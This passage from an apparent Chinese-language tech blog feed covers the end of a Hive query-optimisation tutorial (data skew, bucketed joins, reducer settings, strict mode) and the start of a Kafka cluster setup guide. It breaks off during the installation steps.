class="headerlink" title="4.2.2 空key转换"></a>4.2.2 空key转换</h3><p>有时虽然某个key为空对应的数据很多，但是相应的数据不是异常数据，必须要包含在join的结果中，此时我们可以表a中key为空的字段赋一个随机的值，使得数据随机均匀地分不到不同的reducer上。例如：</p><p>案例实操：</p><p>不随机分布空null值：</p><p>（1）设置5个reduce个数</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">set</span> mapreduce.job.reduces <span class="token operator">=</span> 5<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）JOIN两张表</p><pre class="line-numbers language-bash"><code class="language-bash">insert overwrite table jointable<span class="token keyword">select</span> n.* from nullidtable n left <span class="token function">join</span> bigtable b on n.id <span class="token operator">=</span> b.id<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>结果：如下图所示，可以看出来，出现了数据倾斜，某些reducer的资源消耗远大于其他reducer。</p><p>​                  <img src="/2020/11/15/bigdata-hive4-optimize/1637047154377.png" alt="1637047154377"></p><p>随机分布空null值</p><p>（1）设置5个reduce个数</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">set</span> mapreduce.job.reduces <span class="token operator">=</span> 5<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）JOIN两张表</p><pre class="line-numbers language-bash"><code class="language-bash">insert overwrite table jointable<span class="token keyword">select</span> n.* from nullidtable n full <span class="token function">join</span> bigtable o on nvl<span class="token punctuation">(</span>n.id,rand<span class="token punctuation">(</span><span class="token punctuation">))</span> <span class="token operator">=</span> o.id<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>结果：如下图所示，可以看出来，消除了数据倾斜，负载均衡reducer的资源消耗</p><p>​      <img src="/2020/11/15/bigdata-hive4-optimize/1637047177458.png" alt="1637047177458"></p><h3 id="4-2-3-SMB-Sort-Merge-Bucket-join"><a href="#4-2-3-SMB-Sort-Merge-Bucket-join" class="headerlink" title="4.2.3 SMB(Sort Merge Bucket join)"></a>4.2.3 SMB(Sort Merge Bucket join)</h3><p>（1）创建第二张大表</p><pre class="line-numbers language-bash"><code class="language-bash">create table bigtable2<span class="token punctuation">(</span>  <span class="token function">id</span> bigint,  t bigint,  uid string,  keyword string,  url_rank int,  click_num int,  click_url string<span class="token punctuation">)</span>row <span class="token function">format</span> delimited fields terminated by <span class="token string">'\t'</span><span class="token punctuation">;</span>load data local inpath <span class="token string">'/opt/module/data/bigtable'</span> into table bigtable2<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试大表直接JOIN</p><pre class="line-numbers language-bash"><code class="language-bash">insert overwrite table jointable<span class="token keyword">select</span> b.id, b.t, b.uid, b.keyword, b.url_rank, b.click_num, b.click_urlfrom bigtable s<span class="token function">join</span> bigtable2 bon b.id <span class="token operator">=</span> s.id<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（2）创建分桶表1,桶的个数不要超过可用CPU的核数</p><pre class="line-numbers language-bash"><code class="language-bash">create table bigtable_buck1<span class="token punctuation">(</span>  <span class="token function">id</span> bigint,  t bigint,  uid string,  keyword string,  url_rank int,  click_num int,  click_url string<span class="token punctuation">)</span>clustered by<span class="token punctuation">(</span>id<span class="token punctuation">)</span> sorted by<span class="token punctuation">(</span>id<span class="token punctuation">)</span>into 6 bucketsrow <span class="token function">format</span> delimited fields terminated by <span class="token string">'\t'</span><span class="token punctuation">;</span>insert into bigtable_buck1 <span class="token keyword">select</span> * from bigtable<span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> （3）创建分通表2,桶的个数不要超过可用CPU的核数</p><pre class="line-numbers language-bash"><code class="language-bash">create table bigtable_buck2<span class="token punctuation">(</span>  <span class="token function">id</span> bigint,  t bigint,  uid string,  keyword string,  url_rank int,  click_num int,  click_url string<span class="token punctuation">)</span>clustered by<span class="token punctuation">(</span>id<span class="token punctuation">)</span>sorted by<span class="token punctuation">(</span>id<span class="token punctuation">)</span> into 6 bucketsrow <span class="token function">format</span> delimited fields terminated by <span class="token string">'\t'</span><span class="token punctuation">;</span>insert into bigtable_buck2 <span class="token keyword">select</span> * from bigtable<span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（4）设置参数</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">set</span> hive.optimize.bucketmapjoin <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token keyword">set</span> hive.optimize.bucketmapjoin.sortedmerge <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token keyword">set</span> hive.input.format<span class="token operator">=</span>org.apache.hadoop.hive.ql.io.BucketizedHiveInputFormat<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>（5）测试</p><pre class="line-numbers language-bash"><code class="language-bash">insert overwrite table jointable<span class="token keyword">select</span> b.id, b.t, b.uid, b.keyword, b.url_rank, b.click_num, b.click_urlfrom bigtable_buck1 s<span class="token function">join</span> bigtable_buck2 bon b.id <span class="token operator">=</span> s.id<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-3-Group-By"><a href="#4-3-Group-By" class="headerlink" title="4.3 Group By"></a>4.3 Group By</h2><p>默认情况下，Map阶段同一Key数据分发给一个reduce，当一个key数据过大时就倾斜了。</p><p>​      <img src="/2020/11/15/bigdata-hive4-optimize/1637047313467.png" alt="1637047313467"></p><p>并不是所有的聚合操作都需要在Reduce端完成，很多聚合操作都可以先在Map端进行部分聚合，最后在Reduce端得出最终结果。</p><h3 id="4-3-1-开启Map端聚合参数设置"><a href="#4-3-1-开启Map端聚合参数设置" class="headerlink" title="4.3.1 开启Map端聚合参数设置"></a>4.3.1 开启Map端聚合参数设置</h3><p>（1）是否在Map端进行聚合，默认为True</p><p>set hive.map.aggr = true</p><p>（2）在Map端进行聚合操作的条目数目</p><p>set hive.groupby.mapaggr.checkinterval = 100000</p><p>（3）有数据倾斜的时候进行负载均衡（默认是false）</p><p>set hive.groupby.skewindata = true</p><p>当选项设定为 true，生成的查询计划会有两个MR Job。第一个MR Job中，Map的输出结果会随机分布到Reduce中，每个Reduce做部分聚合操作，并输出结果，这样处理的结果是相同的Group By Key有可能被分发到不同的Reduce中，从而达到负载均衡的目的；第二个MR Job再根据预处理的数据结果按照Group By Key分布到Reduce中（这个过程可以保证相同的Group By Key被分布到同一个Reduce中），最后完成最终的聚合操作。</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> deptno from emp group by deptno<span class="token punctuation">;</span>Stage-Stage-1: Map: 1 Reduce: 5  Cumulative CPU: 23.68 sec  HDFS Read: 19987 HDFS Write: 9 SUCCESSTotal MapReduce CPU Time Spent: 23 seconds 680 msecOKdeptno102030<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>优化以后</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">set</span> hive.groupby.skewindata <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> deptno from emp group by deptno<span class="token punctuation">;</span>Stage-Stage-1: Map: 1 Reduce: 5  Cumulative CPU: 28.53 sec  HDFS Read: 18209 HDFS Write: 534 SUCCESSStage-Stage-2: Map: 1 Reduce: 5  Cumulative CPU: 38.32 sec  HDFS Read: 15014 HDFS Write: 9 SUCCESSTotal MapReduce CPU Time Spent: 1 minutes 6 seconds 850 msecOKdeptno102030<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-4-Count-Distinct-去重统计"><a href="#4-4-Count-Distinct-去重统计" class="headerlink" title="4.4 Count(Distinct) 去重统计"></a>4.4 Count(Distinct) 去重统计</h2><p>数据量小的时候无所谓，数据量大的情况下，由于COUNT DISTINCT操作需要用一个Reduce Task来完成，这一个Reduce需要处理的数据量太大，就会导致整个Job很难完成，一般COUNT DISTINCT使用先GROUP BY再COUNT的方式替换,但是需要注意group by造成的数据倾斜问题.</p><p>1） 案例实操</p><p>（1）创建一张大表</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> create table bigtable<span class="token punctuation">(</span>id bigint, <span class="token function">time</span> bigint, uid string, keywordstring, url_rank int, click_num int, click_url string<span class="token punctuation">)</span> row <span class="token function">format</span> delimitedfields terminated by <span class="token string">'\t'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>（2）加载数据</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> load data local inpath <span class="token string">'/opt/module/datas/bigtable'</span> into table bigtable<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（3）设置5个reduce个数</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">set</span> mapreduce.job.reduces <span class="token operator">=</span> 5<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（4）执行去重id查询</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> count<span class="token punctuation">(</span>distinct id<span class="token punctuation">)</span> from bigtable<span class="token punctuation">;</span>Stage-Stage-1: Map: 1 Reduce: 1  Cumulative CPU: 7.12 sec  HDFS Read: 120741990 HDFS Write: 7 SUCCESSTotal MapReduce CPU Time Spent: 7 seconds 120 msecOKc0100001Time taken: 23.607 seconds, Fetched: 1 row<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（5）采用GROUP by去重id</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> count<span class="token punctuation">(</span>id<span class="token punctuation">)</span> from <span class="token punctuation">(</span>select <span class="token function">id</span> from bigtable group by id<span class="token punctuation">)</span> a<span class="token punctuation">;</span>Stage-Stage-1: Map: 1 Reduce: 5  Cumulative CPU: 17.53 sec  HDFS Read: 120752703 HDFS Write: 580 SUCCESSStage-Stage-2: Map: 1 Reduce: 1  Cumulative CPU: 4.29 sec2  HDFS Read: 9409 HDFS Write: 7 SUCCESSTotal MapReduce CPU Time Spent: 21 seconds 820 msecOK_c0100001Time taken: 50.795 seconds, Fetched: 1 row<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>虽然会多用一个Job来完成，但在数据量大的情况下，这个绝对是值得的。</p><h2 id="4-5-笛卡尔积"><a href="#4-5-笛卡尔积" class="headerlink" title="4.5 笛卡尔积"></a>4.5 笛卡尔积</h2><p>尽量避免笛卡尔积，join的时候不加on条件，或者无效的on条件，Hive只能使用1个reducer来完成笛卡尔积。</p><h2 id="4-6-行列过滤"><a href="#4-6-行列过滤" class="headerlink" title="4.6 行列过滤"></a>4.6 行列过滤</h2><p>列处理：在SELECT中，只拿需要的列，如果有分区，尽量使用分区过滤，少用SELECT *。</p><p>行处理：在分区剪裁中，当使用外关联时，如果将副表的过滤条件写在Where后面，那么就会先全表关联，之后再过滤，比如：</p><p>案例实操：</p><p>1）测试先关联两张表，再用where条件过滤</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> o.id from bigtable b<span class="token function">join</span> bigtable  o.id <span class="token operator">=</span> b.idwhere o.id <span class="token operator">&lt;=</span> 10<span class="token punctuation">;</span>Time taken: 34.406 seconds, Fetched: 100 row<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>2）通过子查询后，再关联表</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> b.id from bigtable b<span class="token function">join</span> <span class="token punctuation">(</span>select <span class="token function">id</span> from bigtable where <span class="token function">id</span> <span class="token operator">&lt;=</span> 10 <span class="token punctuation">)</span> o on b.id <span class="token operator">=</span> o.id<span class="token punctuation">;</span>Time taken: 30.058 seconds, Fetched: 100 row<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="4-7-分区分桶"><a href="#4-7-分区分桶" class="headerlink" title="4.7 分区分桶"></a>4.7 分区分桶</h2><p>在涉及存储结构时候，设置分区分桶，查找时候效率就会更高。</p><h1 id="5-合理设置Map及Reduce数"><a href="#5-合理设置Map及Reduce数" class="headerlink" title="5 合理设置Map及Reduce数"></a>5 合理设置Map及Reduce数</h1><p>1）通常情况下，作业会通过input的目录产生一个或者多个map任务。</p><p>主要的决定因素有：input的文件总个数，input的文件大小，集群设置的文件块大小。</p><p>2）是不是map数越多越好？</p><p>答案是否定的。如果一个任务有很多小文件（远远小于块大小128m），则每个小文件也会被当做一个块，用一个map任务来完成，而一个map任务启动和初始化的时间远远大于逻辑处理的时间，就会造成很大的资源浪费。而且，同时可执行的map数是受限的。</p><p>3）是不是保证每个map处理接近128m的文件块，就高枕无忧了？</p><p>答案也是不一定。比如有一个127m的文件，正常会用一个map去完成，但这个文件只有一个或者两个小字段，却有几千万的记录，如果map处理的逻辑比较复杂，用一个map任务去做，肯定也比较耗时。</p><p>针对上面的问题2和3，我们需要采取两种方式来解决：即减少map数和增加map数；</p><h2 id="5-1-复杂文件增加Map数"><a href="#5-1-复杂文件增加Map数" class="headerlink" title="5.1 复杂文件增加Map数"></a>5.1 复杂文件增加Map数</h2><p>当input的文件都很大，任务逻辑复杂，map执行非常慢的时候，可以考虑增加Map数，来使得每个map处理的数据量减少，从而提高任务的执行效率。</p><p>增加map的方法为：根据</p><p>computeSliteSize(Math.max(minSize,Math.min(maxSize,blocksize)))=blocksize=128M公式，调整maxSize最大值。让maxSize最大值低于blocksize就可以增加map的个数。</p><p>案例实操：</p><p>1）执行查询</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> count<span class="token punctuation">(</span>*<span class="token punctuation">)</span> from emp<span class="token punctuation">;</span>Hadoop job information <span class="token keyword">for</span> Stage-1: number of mappers: 1<span class="token punctuation">;</span> number of reducers: 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>2）设置最大切片值为100个字节</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">set</span> mapreduce.input.fileinputformat.split.maxsize<span class="token operator">=</span>100<span class="token punctuation">;</span>hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> count<span class="token punctuation">(</span>*<span class="token punctuation">)</span> from emp<span class="token punctuation">;</span>Hadoop job information <span class="token keyword">for</span> Stage-1: number of mappers: 6<span class="token punctuation">;</span> number of reducers: 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="5-2-小文件进行合并"><a href="#5-2-小文件进行合并" class="headerlink" title="5.2 小文件进行合并"></a>5.2 小文件进行合并</h2><p>1）在map执行前合并小文件，减少map数：CombineHiveInputFormat具有对小文件进行合并的功能（系统默认的格式）。HiveInputFormat没有对小文件合并功能。</p><p>set hive.input.format= org.apache.hadoop.hive.ql.io.CombineHiveInputFormat;</p><p>2）在Map-Reduce的任务结束时合并小文件的设置：</p><p>在map-only任务结束时合并小文件，默认true</p><p>SET hive.merge.mapfiles = true;</p><p>在map-reduce任务结束时合并小文件，默认false</p><p>SET hive.merge.mapredfiles = true;</p><p>合并文件的大小，默认256M</p><p>SET hive.merge.size.per.task = 268435456;</p><p>当输出文件的平均大小小于该值时，启动一个独立的map-reduce任务进行文件merge</p><p>SET hive.merge.smallfiles.avgsize = 16777216;</p><h2 id="5-3-合理设置Reduce数"><a href="#5-3-合理设置Reduce数" class="headerlink" title="5.3 合理设置Reduce数"></a>5.3 合理设置Reduce数</h2><p>1）调整reduce个数方法一</p><p>（1）每个Reduce处理的数据量默认是256MB</p><p>hive.exec.reducers.bytes.per.reducer=256000000</p><p>（2）每个任务最大的reduce数，默认为1009</p><p>hive.exec.reducers.max=1009</p><p>（3）计算reducer数的公式</p><p>N=min(参数2，总输入数据量/参数1)</p><p>2）调整reduce个数方法二</p><p>在hadoop的mapred-default.xml文件中修改</p><p>设置每个job的Reduce个数</p><p>set mapreduce.job.reduces = 15;</p><p>3）reduce个数并不是越多越好</p><p>（1）过多的启动和初始化reduce也会消耗时间和资源；</p><p>（2）另外，有多少个reduce，就会有多少个输出文件，如果生成了很多个小文件，那么如果这些小文件作为下一个任务的输入，则也会出现小文件过多的问题；</p><p>在设置reduce个数的时候也需要考虑这两个原则：处理大数据量利用合适的reduce数；使单个reduce任务处理数据量大小要合适；</p><h1 id="6-并行执行"><a href="#6-并行执行" class="headerlink" title="6 并行执行"></a>6 并行执行</h1><p>Hive会将一个查询转化成一个或者多个阶段。这样的阶段可以是MapReduce阶段、抽样阶段、合并阶段、limit阶段。或者Hive执行过程中可能需要的其他阶段。默认情况下，Hive一次只会执行一个阶段。不过，某个特定的job可能包含众多的阶段，而这些阶段可能并非完全互相依赖的，也就是说有些阶段是可以并行执行的，这样可能使得整个job的执行时间缩短。不过，如果有更多的阶段可以并行执行，那么job可能就越快完成。</p><p>通过设置参数hive.exec.parallel值为true，就可以开启并发执行。不过，在共享集群中，需要注意下，如果job中并行阶段增多，那么集群利用率就会增加。</p><p>set hive.exec.parallel=true;       //打开任务并行执行</p><p>set hive.exec.parallel.thread.number=16; //同一个sql允许最大并行度，默认为8。</p><p>当然，得是在系统资源比较空闲的时候才有优势，否则，没资源，并行也起不来。</p><h1 id="7-严格模式"><a href="#7-严格模式" class="headerlink" title="7 严格模式"></a>7 严格模式</h1><p>Hive可以通过设置防止一些危险操作：</p><p>1）分区表不使用分区过滤</p><p>  将hive.strict.checks.no.partition.filter设置为true时，对于分区表，除非where语句中含有分区字段过滤条件来限制范围，否则不允许执行。换句话说，就是用户不允许扫描所有分区。进行这个限制的原因是，通常分区表都拥有非常大的数据集，而且数据增加迅速。没有进行分区限制的查询可能会消耗令人不可接受的巨大资源来处理这个表。<br> 2）使用order by没有limit过滤</p><p> 将hive.strict.checks.orderby.no.limit设置为true时，对于使用了order by语句的查询，要求必须使用limit语句。因为order by为了执行排序过程会将所有的结果数据分发到同一个Reducer中进行处理，强制要求用户增加这个LIMIT语句可以防止Reducer额外执行很长一段时间。</p><p>3）笛卡尔积</p><p> 将hive.strict.checks.cartesian.product设置为true时，会限制笛卡尔积的查询。对关系型数据库非常了解的用户可能期望在 执行JOIN查询的时候不使用ON语句而是使用where语句，这样关系数据库的执行优化器就可以高效地将WHERE语句转化成那个ON语句。不幸的是，Hive并不会执行这种优化，因此，如果表足够大，那么这个查询就会出现不可控的情况。</p><h1 id="8-压缩"><a href="#8-压缩" class="headerlink" title="8 压缩"></a>8 压缩</h1><p>在实际的项目开发当中，hive表的数据存储格式一般选择：orc或parquet。压缩方式一般选择snappy，lzo。</p>]]></content:encoded>
      
      
      <category domain="https://m01ly.github.io/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BC%80%E5%8F%91/">大数据开发</category>
      
      
      <category domain="https://m01ly.github.io/tags/Hive/">Hive</category>
      
      
      <comments>https://m01ly.github.io/2020/11/15/bigdata-hive4-optimize/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>kafka学习笔记（一） kafka搭建</title>
      <link>https://m01ly.github.io/2020/11/15/bigdata-kafka1-setup/</link>
      <guid>https://m01ly.github.io/2020/11/15/bigdata-kafka1-setup/</guid>
      <pubDate>Sat, 14 Nov 2020 22:46:51 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1-Kafka概述"><a href="#1-Kafka概述" class="headerlink" title="1 Kafka概述"></a>1 Kafka概述</h1><h2 id="1-1-定义"><a href="#1-1-定义" class="headerlink" title="1.1 定义"></a>1.1 定义</h2><p>Kafka是一个分布式的基于发布/订阅模式的消息队列（Message Queue），主要应用于大数据实时处理领域。</p><h2 id="1-2-消息队列"><a href="#1-2-消息队列" class="headerlink" title="1.2 消息队列"></a>1.2 消息队列</h2><h3 id="1-2-1-传统消息队列的应用场景"><a href="#1-2-1-传统消息队列的应用场景" class="headerlink" title="1.2.1 传统消息队列的应用场景"></a>1.2.1 传统消息队列的应用场景</h3><p><img src="/2020/11/15/bigdata-kafka1-setup/1637153923628.png" alt="1637153923628">            </p><p>使用消息队列的好处</p><p>1）解耦</p><p>允许你独立的扩展或修改两边的处理过程，只要确保它们遵守同样的接口约束。</p><p>2）可恢复性</p><p>系统的一部分组件失效时，不会影响到整个系统。消息队列降低了进程间的耦合度，所以即使一个处理消息的进程挂掉，加入队列中的消息仍然可以在系统恢复后被处理。</p><p>3）缓冲</p><p>有助于控制和优化数据流经过系统的速度，解决生产消息和消费消息的处理速度不一致的情况。</p><p>4）灵活性 &amp; 峰值处理能力</p><p>在访问量剧增的情况下，应用仍然需要继续发挥作用，但是这样的突发流量并不常见。如果为以能处理这类峰值访问为标准来投入资源随时待命无疑是巨大的浪费。使用消息队列能够使关键组件顶住突发的访问压力，而不会因为突发的超负荷的请求而完全崩溃。</p><p>5）异步通信</p><p>很多时候，用户不想也不需要立即处理消息。消息队列提供了异步处理机制，允许用户把一个消息放入队列，但并不立即处理它。想向队列中放入多少消息就放多少，然后在需要的时候再去处理它们。</p><h3 id="1-2-2-消息队列的两种模式"><a href="#1-2-2-消息队列的两种模式" class="headerlink" title="1.2.2 消息队列的两种模式"></a>1.2.2 消息队列的两种模式</h3><p>（1）点对点模式（一对一，消费者主动拉取数据，消息收到后消息清除）</p><p>消息生产者生产消息发送到Queue中，然后消息消费者从Queue中<strong>取出</strong>并且消费消息。（<strong>这里注意是消费者主动拉取的</strong>）</p><p>消息被消费以后，queue中不再有存储，所以消息消费者不可能消费到已经被消费的消息。Queue支持存在多个消费者，但是对一个消息而言，只会有一个消费者可以消费。  </p><p><img src="/2020/11/15/bigdata-kafka1-setup/1637153951339.png" alt="1637153951339"></p><p>（2）发布/订阅模式（一对多，消费者消费数据之后不会清除消息）</p><p>消息生产者（发布）将消息发布到topic中，同时有多个消息消费者（订阅）<strong>消费</strong>该消息。和点对点方式不同，发布到topic的消息会被所有订阅者消费。（<strong>这里注意数据也是消费者拉取的，因为消费者会一直轮询topic是否有消息</strong>）</p><p><img src="/2020/11/15/bigdata-kafka1-setup/1637153963262.png" alt="1637153963262"></p><h2 id="1-3-Kafka基础架构"><a href="#1-3-Kafka基础架构" class="headerlink" title="1.3 Kafka基础架构"></a>1.3 Kafka基础架构</h2><p>  <img src="/2020/11/15/bigdata-kafka1-setup/1637154054233.png" alt="1637154054233"></p><p>1）Producer ：消息生产者，就是向kafka broker发消息的客户端；</p><p>2）Consumer ：消息消费者，向kafka broker取消息的客户端；</p><p>3）Consumer Group （CG）：消费者组，由多个consumer组成。消费者组内每个消费者负责消费不同分区的数据，一个分区只能由一个组内消费者消费；消费者组之间互不影响。所有的消费者都属于某个消费者组，即消费者组是逻辑上的一个订阅者。</p><p>4）Broker ：一台kafka服务器就是一个broker。一个集群由多个broker组成。一个broker可以容纳多个topic。</p><p>5）Topic ：可以理解为一个队列，生产者和消费者面向的都是一个topic；</p><p>6）Partition：为了实现扩展性，一个非常大的topic可以分布到多个broker（即服务器）上，一个topic可以分为多个partition，每个partition是一个有序的队列；</p><p>7）Replica：副本，为保证集群中的某个节点发生故障时，该节点上的partition数据不丢失，且kafka仍然能够继续工作，kafka提供了副本机制，一个topic的每个分区都有若干个副本，一个leader和若干个follower。</p><p>8）leader：每个分区多个副本的“主”，生产者发送数据的对象，以及消费者消费数据的对象都是leader。</p><p>9）follower：每个分区多个副本中的“从”，实时从leader中同步数据，保持和leader数据的同步。leader发生故障时，某个follower会成为新的leader。</p><p>10）kafka集群依赖于zookeeper管理。</p><h1 id="2-Kafka安装部署"><a href="#2-Kafka安装部署" class="headerlink" title="2 Kafka安装部署"></a>2 Kafka安装部署</h1><h2 id="2-1-集群规划"><a href="#2-1-集群规划" class="headerlink" title="2.1 集群规划"></a>2.1 集群规划</h2><table><thead><tr><th>hadoop102</th><th>hadoop103</th><th>hadoop104</th></tr></thead><tbody><tr><td>zk</td><td>zk</td><td>zk</td></tr><tr><td>kafka</td><td>kafka</td><td>kafka</td></tr></tbody></table><h2 id="2-2-Kafka-下载"><a href="#2-2-Kafka-下载" class="headerlink" title="2.2 Kafka 下载"></a>2.2 Kafka 下载</h2><p><a href="http://kafka.apache.org/downloads.html">http://kafka.apache.org/downloads.html</a></p><h2 id="2-3-集群部署"><a href="#2-3-集群部署" class="headerlink" title="2.3 集群部署"></a>2.3 集群部署</h2><p>1）解压安装包</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 software<span class="token punctuation">]</span>$ <span class="token function">tar</span> -zxvf kafka_2.11-2.4.1.tgz -C /opt/module/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）修改解压后的文件名称</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 module<span class="token punctuation">]</span>$ <span class="token function">mv</span> kafka_2.11-2.4.1.tgz kafka<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）在/opt/module/kafka目录下创建logs文件夹</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 kafka<span class="token punctuation">]</span>$ <span class="token function">mkdir</span> logs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4）修改配置文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 kafka<span class="token punctuation">]</span>$ <span class="token function">cd</span> config/<span class="token punctuation">[</span>molly@hadoop102 config<span class="token punctuation">]</span>$ <span class="token function">vi</span> server.properties<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>输入以下内容：</p><pre class="line-numbers language-sh"><code class="language-sh">#broker的全局唯一编号，不能重复broker.id=0#删除topic功能使能,当前版本此配置默认为true，已从配置文件移除delete.topic.enable=true#处理网络请求的线程数量num.network.threads=3#用来处理磁盘IO的线程数量num.io.threads=8#发送套接字的缓冲区大小socket.send.buffer.bytes=102400#接收套接字的缓冲区大小socket.receive.buffer.bytes=102400#请求套接字的缓冲区大小socket.request.max.bytes=104857600#kafka运行日志存放的路径log.dirs=/opt/module/kafka/logs#topic在当前broker上的分区个数num.partitions=1#用来恢复和清理data下数据的线程数量num.recovery.threads.per.data.dir=1#segment文件保留的最长时间，超时将被删除log.retention.hours=168#配置连接Zookeeper集群地址zookeeper.connect=hadoop102:2181,hadoop103:2181,hadoop104:2181<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>5）配置环境变量</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 module<span class="token punctuation">]</span>$ <span class="token function">sudo</span> vim /etc/profile.d/my_env.sh<span class="token comment" spellcheck="true">#KAFKA_HOME</span><span class="token function">export</span> KAFKA_HOME<span class="token operator">=</span>/opt/module/kafka<span class="token function">export</span> PATH<span class="token operator">=</span><span class="token variable">$PATH</span><span class="token keyword">:</span><span class="token variable">$KAFKA_HOME</span>/bin<span class="token punctuation">[</span>molly@hadoop102 module<span class="token punctuation">]</span>$ <span class="token function">source</span> /etc/profile<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 6）分发安装包</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 module<span class="token punctuation">]</span>$ xsync kafka/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​    注意：分发之后记得配置其他机器的环境变量</p><p>7）分别在hadoop103和hadoop104上修改配置文件/opt/module/kafka/config/server.properties中的broker.id=1、broker.id=2</p><p>​    